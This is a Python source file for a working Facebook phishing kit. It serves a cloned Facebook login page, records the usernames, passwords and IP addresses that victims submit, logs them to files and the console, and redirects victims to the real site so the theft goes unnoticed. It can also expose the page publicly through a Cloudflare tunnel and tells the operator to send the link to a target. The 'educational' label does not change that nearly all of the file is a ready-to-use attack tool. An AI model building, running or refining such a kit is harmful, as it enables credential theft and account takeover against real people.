import os
import json
import threading
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from ui.console import cprint, iprint, wprint, eprint, cinput, CYAN, GREEN, RED, YELLOW, WHITE, RESET

# Facebook-inspired login page HTML template
FACEBOOK_LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            display: flex;
            gap: 40px;
            width: 100%;
            max-width: 1000px;
            padding: 20px;
        }
        
        .login-left {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .logo {
            font-size: 48px;
            font-weight: bold;
            color: #0a66c2;
            margin-bottom: 10px;
        }
        
        .tagline {
            font-size: 24px;
            line-height: 32px;
            color: #65676b;
        }
        
        .login-right {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .login-form {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 16px 0;
            width: 100%;
            max-width: 396px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px 16px;
            margin: 8px 0;
            border: 1px solid #cec9c9;
            border-radius: 6px;
            font-size: 15px;
            font-family: inherit;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-button {
            width: 100%;
            padding: 12px 16px;
            margin: 16px 0 8px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-button:hover {
            background-color: #165ec9;
        }
        
        .forgot-password {
            text-align: center;
            margin: 16px 0 8px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 13px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            border-top: 1px solid #cec9c9;
            margin: 16px 0;
        }
        
        .create-account {
            text-align: center;
            padding: 16px 0;
        }
        
        .create-button {
            background-color: #31a24c;
            border: none;
            border-radius: 6px;
            color: white;
            padding: 10px 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .create-button:hover {
            background-color: #289142;
        }
        
        .container-padding {
            padding: 16px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-left">
            <div class="logo">facebook</div>
            <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
        </div>
        
        <div class="login-right">
            <form class="login-form" method="POST" action="/login">
                <div class="container-padding">
                    <input type="email" class="form-input" name="username" placeholder="Email or phone number" required>
                    <input type="password" class="form-input" name="password" placeholder="Password" required>
                    <button type="submit" class="login-button">Log in</button>
                    
                    <div class="forgot-password">
                        <a href="#">Forgotten password?</a>
                    </div>
                    
                    <div class="divider"></div>
                    
                    <div class="create-account">
                        <button type="button" class="create-button">Create new Facebook account</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
"""


class FacebookPhishingHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing server"""
    
    credentials_log = []
    log_file = None
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/' or self.path == '/login':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(FACEBOOK_LOGIN_HTML.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests (form submission)"""
        try:
            if self.path == '/login':
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # Parse form data
                parsed_data = parse_qs(post_data)
                username = parsed_data.get('username', [''])[0] if 'username' in parsed_data else ''
                password = parsed_data.get('password', [''])[0] if 'password' in parsed_data else ''
                
                # Only log if we have credentials
                if username or password:
                    # Log credentials
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    credential_entry = {
                        'timestamp': timestamp,
                        'username': username,
                        'password': password,
                        'ip': self.client_address[0]
                    }
                    
                    FacebookPhishingHandler.credentials_log.append(credential_entry)
                    
                    # Log to file
                    if FacebookPhishingHandler.log_file:
                        with open(FacebookPhishingHandler.log_file, 'a') as f:
                            f.write(f"{timestamp} | IP: {self.client_address[0]} | Username: {username} | Password: {password}\n")
                    
                    # Print to server console (debug)
                    print(f"\n[+] Credentials captured: {username} / {password}")
                
                # Send redirect response (silent, no page shown)
                self.send_response(302)
                self.send_header('Location', 'https://www.facebook.com')
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            print(f"[!] Error in POST handler: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


class FacebookPhishing:
    """Simple Facebook phishing framework for educational purposes"""
    
    def __init__(self, port=8000):
        self.port = port
        self.server = None
        self.server_thread = None
        self.running = False
        self.credentials_file = None
    
    def setup_logging(self):
        """Create logs directory and setup credential logging"""
        # Get the project root (go up from phishing folder)
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        logs_dir = os.path.join(project_root, 'phishing_logs')
        
        # Create logs directory
        os.makedirs(logs_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.credentials_file = os.path.join(logs_dir, f'facebook_creds_{timestamp}.txt')
        
        # Write header
        with open(self.credentials_file, 'w') as f:
            f.write(f"Facebook Phishing Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
            f.write("Timestamp | IP Address | Username | Password\n")
            f.write("=" * 80 + "\n")
        
        iprint(f"Log file: {self.credentials_file}")
        FacebookPhishingHandler.log_file = self.credentials_file
        return self.credentials_file
    
    def start_server(self):
        """Start the phishing server"""
        try:
            import socket
            FacebookPhishingHandler.credentials_log = []
            iprint(f"Starting phishing server on port {self.port}...")
            
            # Create server with explicit socket settings
            self.server = HTTPServer(('0.0.0.0', self.port), FacebookPhishingHandler)
            self.server.allow_reuse_address = True
            
            iprint(f"Server bound to: http://0.0.0.0:{self.port}")
            iprint(f"Attempting to access on: http://127.0.0.1:{self.port}\n")
            
            self.running = True
            self.server.serve_forever()
        except Exception as e:
            eprint(f"Error starting server: {e}")
            import traceback
            eprint(traceback.format_exc())
    

    def run_interactive(self):
        """Interactive mode for phishing server"""
        try:
            cprint("\n=== Facebook Phishing Server ===\n", CYAN)
            
            # Setup logging
            log_file = self.setup_logging()
            
            # Get port (optional)
            port_input = cinput("Enter port [8000]: ")
            if port_input:
                try:
                    self.port = int(port_input)
                except ValueError:
                    wprint("Invalid port, using 8000")
                    self.port = 8000
            
            # Choose between localhost and cloudflare
            cprint("\n[*] Hosting Options:", CYAN)
            cprint("    1) Localhost (SSH tunnel required from Windows)", WHITE)
            cprint("    2) Cloudflare Tunnel (public URL, no SSH needed)\n", WHITE)
            
            hosting_choice = cinput("Choose hosting method [1]: ")
            if not hosting_choice:
                hosting_choice = "1"
            
            use_cloudflare = hosting_choice == "2"
            
            cprint(f"\n[*] Configuration:", CYAN)
            iprint(f"    Template: Facebook Login")
            iprint(f"    Port: {self.port}")
            iprint(f"    Credentials file: {log_file}")
            iprint(f"    Hosting: {'Cloudflare Tunnel' if use_cloudflare else 'Localhost'}")
            cprint(f"    Status: Starting server...\n", GREEN)
            
            # Start server in background thread
            self.server_thread = threading.Thread(target=self.start_server, daemon=True)
            self.server_thread.start()
            
            # Give server time to start and verify it's actually listening
            import time
            import socket
            max_wait = 5
            waited = 0
            server_ready = False
            
            while waited < max_wait:
                try:
                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_socket.settimeout(0.5)
                    result = test_socket.connect_ex(('127.0.0.1', self.port))
                    test_socket.close()
                    if result == 0:
                        iprint("Server is listening and ready!")
                        server_ready = True
                        break
                except:
                    pass
                time.sleep(0.5)
                waited += 0.5
            
            if not server_ready:
                wprint("Warning: Server may not be fully ready, continuing anyway...")
            
            if use_cloudflare:
                self._setup_cloudflare_tunnel()
            else:
                self._setup_localhost_access()
            
            cprint("[*] Press Ctrl+C to stop server\n", YELLOW)
            
            # Keep running and display credentials as they arrive
            last_credential_count = 0
            while self.running:
                import time
                time.sleep(0.5)
                current_count = len(FacebookPhishingHandler.credentials_log)
                
                # If new credentials arrived, display them
                if current_count > last_credential_count:
                    new_creds = FacebookPhishingHandler.credentials_log[last_credential_count:]
                    for cred in new_creds:
                        cprint("\n" + "="*80, GREEN)
                        cprint("[+] CREDENTIALS CAPTURED!", GREEN)
                        cprint("="*80, GREEN)
                        iprint(f"Timestamp: {cred['timestamp']}")
                        iprint(f"IP Address: {cred['ip']}")
                        cprint(f"Username: {cred['username']}", YELLOW)
                        cprint(f"Password: {cred['password']}", RED)
                        cprint("="*80 + "\n", GREEN)
                    last_credential_count = current_count
        
        except KeyboardInterrupt:
            self.running = False
            if self.server:
                self.server.shutdown()
            if self.tunnel_process:
                self.tunnel_process.terminate()
            wprint("\n[-] Server stopped by user")
        except Exception as e:
            eprint(f"Error: {e}")
        finally:
            cinput("\nPress Enter to return to menu...")
    
    def _setup_localhost_access(self):
        """Setup localhost access with SSH tunnel instructions"""
        # Get Pi IP for SSH command
        pi_ip = cinput("Enter your Pi IP address (e.g., 192.168.100.88): ")
        if not pi_ip:
            pi_ip = "192.168.100.88"
        
        pi_user = cinput("Enter Pi username [florin]: ")
        if not pi_user:
            pi_user = "florin"
        
        # Display SSH command
        cprint("\n[*] SSH Port Forwarding Command (run on Windows PowerShell):", YELLOW)
        ssh_cmd = f"ssh -L {self.port}:127.0.0.1:{self.port} {pi_user}@{pi_ip}"
        cprint(f"    {ssh_cmd}\n", CYAN)
        
        cprint("[*] After SSH connects, visit in browser:", YELLOW)
        cprint(f"    http://localhost:{self.port}\n", CYAN)
    
    def _setup_cloudflare_tunnel(self):
        """Setup Cloudflare Tunnel for public access"""
        # Check if cloudflared is installed
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
            cloudflared_installed = True
        except (subprocess.CalledProcessError, FileNotFoundError):
            cloudflared_installed = False
        
        if not cloudflared_installed:
            eprint("\n[!] cloudflared is not installed!")
            cprint("\n[*] Install cloudflared with:", YELLOW)
            cprint("    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", CYAN)
            cprint("    chmod +x cloudflared-linux-arm64", CYAN)
            cprint("    sudo mv cloudflared-linux-arm64 /usr/local/bin/cloudflared\n", CYAN)
            return
        
        cprint("\n[*] Starting Cloudflare Tunnel...\n", GREEN)
        
        try:
            # Start cloudflared tunnel - display output directly to user
            # Use 127.0.0.1 explicitly instead of localhost for better compatibility
            cmd = f"cloudflared tunnel --url http://127.0.0.1:{self.port}"
            self.tunnel_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, preexec_fn=None)
            
            # Read and display cloudflared output in real-time
            import time
            import threading
            
            url_found = [False]  # Use list to allow modification in nested function
            
            def read_tunnel_output():
                try:
                    for line in self.tunnel_process.stdout:
                        if line:
                            iprint(line.strip())
                            # Look for the tunnel URL
                            if "trycloudflare.com" in line or ("https://" in line and not url_found[0]):
                                cprint(f"\n[+] PUBLIC URL: {line.strip()}\n", GREEN)
                                url_found[0] = True
                except Exception as e:
                    pass
            
            # Start output reader in background thread
            output_thread = threading.Thread(target=read_tunnel_output, daemon=True)
            output_thread.start()
            
            # Give tunnel time to establish and display URL
            time.sleep(5)
            
            # Check if process is still running
            if self.tunnel_process.poll() is None:
                cprint("[!] IMPORTANT: Copy the public URL above and send to your target\n", RED)
                cprint("[*] Cloudflare Tunnel will stay active until you stop the server\n", GREEN)
                # Don't wait here - return and let process run in background
                return
            else:
                eprint("\n[!] Failed to start Cloudflare Tunnel")
                eprint("Try running manually: cloudflared tunnel --url http://localhost:8000")
        
        except Exception as e:
            eprint(f"[!] Error starting Cloudflare Tunnel: {e}")
